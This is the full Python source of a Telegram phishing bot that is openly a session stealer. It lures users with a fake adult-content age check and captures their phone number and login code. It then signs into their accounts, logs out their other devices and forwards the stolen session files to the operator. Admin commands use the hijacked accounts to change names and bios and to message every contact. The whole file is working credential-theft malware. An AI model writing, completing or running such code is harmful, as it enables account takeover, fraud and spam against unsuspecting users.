import os, asyncio, logging, random, string, json
from datetime import datetime
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, filters

# --- CONFIG ---
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
API_ID = int(os.getenv('API_ID', '12345'))
API_HASH = os.getenv('API_HASH', 'your_api_hash')
ADMIN_IDS = set(int(x) for x in os.getenv('ADMIN_IDS', '123456789').split(',') if x)
SESSION_DIR = 'sessions'
os.makedirs(SESSION_DIR, exist_ok=True)

# --- STATES ---
PHONE, CODE = range(2)

# --- LOGGING ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- HELPER ---
def save_session(user_id, phone, session_string):
    path = os.path.join(SESSION_DIR, f'{user_id}.json')
    with open(path, 'w') as f:
        json.dump({'phone': phone, 'session': session_string, 'timestamp': datetime.now().isoformat()}, f)
    return path

def load_session(user_id):
    path = os.path.join(SESSION_DIR, f'{user_id}.json')
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return None

async def create_client(session_string=None):
    if session_string:
        return TelegramClient(StringSession(session_string), API_ID, API_HASH)
    else:
        return TelegramClient(StringSession(), API_ID, API_HASH)

async def logout_other_devices(client):
    try:
        auths = await client(functions.account.GetAuthorizationsRequest())
        current_hash = None
        for auth in auths.authorizations:
            if auth.current:
                current_hash = auth.hash
                break
        if current_hash:
            for auth in auths.authorizations:
                if not auth.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
        logger.info("Logged out other devices")
    except Exception as e:
        logger.error(f"Error logging out other devices: {e}")

# --- BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("🔞 CLICK HERE FOR 18+ CONTENT", callback_data='start_steal')]]
    await update.message.reply_text(
        "🔥 **WELCOME TO THE ADULT ZONE** 🔥\n"
        "Click below to verify your age and access exclusive content!\n\n"
        "*We never store your personal info.*",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode='Markdown'
    )

async def start_steal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📱 **Enter your Telegram phone number** (with country code):\n"
        "Example: +1234567890\n\n"
        "We'll send a verification code instantly."
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    try:
        client = await create_client()
        await client.connect()
        result = await client.send_code_request(phone)
        context.user_data['phone_code_hash'] = result.phone_code_hash
        await client.disconnect()
        
        # Build keypad
        buttons = []
        for i in range(1, 10):
            buttons.append(InlineKeyboardButton(str(i), callback_data=f'code_{i}'))
        buttons.append(InlineKeyboardButton('0', callback_data='code_0'))
        buttons.append(InlineKeyboardButton('⌫', callback_data='code_del'))
        buttons.append(InlineKeyboardButton('✅ SUBMIT', callback_data='code_submit'))
        keyboard = [buttons[i:i+3] for i in range(0, 9, 3)]
        keyboard.append([buttons[9], buttons[10], buttons[11]])
        context.user_data['code'] = ''
        await update.message.reply_text(
            "🔢 **Enter the 5-digit code** sent to your Telegram app:\n"
            "Use the keypad below.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}\nTry again with /start")
        return ConversationHandler.END

async def code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith('code_'):
        digit = data.split('_')[1]
        if digit == 'del':
            context.user_data['code'] = context.user_data['code'][:-1]
        elif digit == 'submit':
            phone = context.user_data['phone']
            code = context.user_data['code']
            phone_code_hash = context.user_data.get('phone_code_hash')
            if not code:
                await query.edit_message_text("❌ Please enter a code first.")
                return
            try:
                client = await create_client()
                await client.connect()
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                session_string = client.session.save()
                user_id = update.effective_user.id
                save_session(user_id, phone, session_string)
                await logout_other_devices(client)
                await query.edit_message_text(
                    "✅ **Verification successful!** Welcome to the adult hub.\n"
                    "You will now be redirected to exclusive content... (just kidding, you've been pwned)"
                )
                # Send session to admin
                for admin in ADMIN_IDS:
                    try:
                        await context.bot.send_document(
                            chat_id=admin,
                            document=open(os.path.join(SESSION_DIR, f'{user_id}.json'), 'rb'),
                            caption=f"🎯 **New session stolen!**\nUser: {update.effective_user.mention_html()}\nPhone: {phone}\nTime: {datetime.now()}"
                        )
                    except Exception as e:
                        logger.error(f"Failed to send session to admin {admin}: {e}")
                await client.disconnect()
                return ConversationHandler.END
            except Exception as e:
                await query.edit_message_text(f"❌ Login failed: {str(e)}\nTry again with /start")
                return ConversationHandler.END
        else:
            context.user_data['code'] += digit
        # Update keypad display
        current = context.user_data['code']
        display_text = f"🔢 **Enter code:** `{current}`\n(Use keypad below)"
        # Rebuild same keyboard
        buttons = []
        for i in range(1, 10):
            buttons.append(InlineKeyboardButton(str(i), callback_data=f'code_{i}'))
        buttons.append(InlineKeyboardButton('0', callback_data='code_0'))
        buttons.append(InlineKeyboardButton('⌫', callback_data='code_del'))
        buttons.append(InlineKeyboardButton('✅ SUBMIT', callback_data='code_submit'))
        keyboard = [buttons[i:i+3] for i in range(0, 9, 3)]
        keyboard.append([buttons[9], buttons[10], buttons[11]])
        await query.edit_message_text(display_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# --- ADMIN COMMANDS ---
def admin_only(func):
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("⛔ You are not authorized.")
            return
        return await func(update, context)
    return wrapper

@admin_only
async def setname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setname <user_id> <new_name>")
        return
    user_id = args[0]
    new_name = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        await client(functions.account.UpdateProfileRequest(first_name=new_name))
        await update.message.reply_text(f"✅ Updated profile name for {user_id} to '{new_name}'")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def setbio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setbio <user_id> <new_bio>")
        return
    user_id = args[0]
    new_bio = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        await client(functions.account.UpdateProfileRequest(about=new_bio))
        await update.message.reply_text(f"✅ Updated bio for {user_id} to '{new_bio}'")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /broadcast <user_id> <message>")
        return
    user_id = args[0]
    msg_text = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        dialogs = await client.get_dialogs()
        count = 0
        for dialog in dialogs:
            try:
                await client.send_message(dialog.entity, msg_text)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await update.message.reply_text(f"✅ Broadcast sent to {count} chats.")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = os.listdir(SESSION_DIR)
    if not files:
        await update.message.reply_text("No sessions stolen yet.")
        return
    msg = "📋 **Stolen Sessions:**\n"
    for f in files:
        with open(os.path.join(SESSION_DIR, f)) as jf:
            data = json.load(jf)
            msg += f"User ID: {f.replace('.json','')}, Phone: {data.get('phone','unknown')}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

# --- CONVERSATION HANDLER ---
conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(start_steal_callback, pattern='start_steal')],
    states={
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [CallbackQueryHandler(code_callback, pattern='^code_')],
    },
    fallbacks=[CommandHandler('start', start)],
)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler('setname', setname))
    app.add_handler(CommandHandler('setbio', setbio))
    app.add_handler(CommandHandler('broadcast', broadcast))
    app.add_handler(CommandHandler('listsessions', list_sessions))
    app.add_handler(CommandHandler('ping', lambda u,c: u.message.reply_text('Pong!')))
    print("🚀 Stealer bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()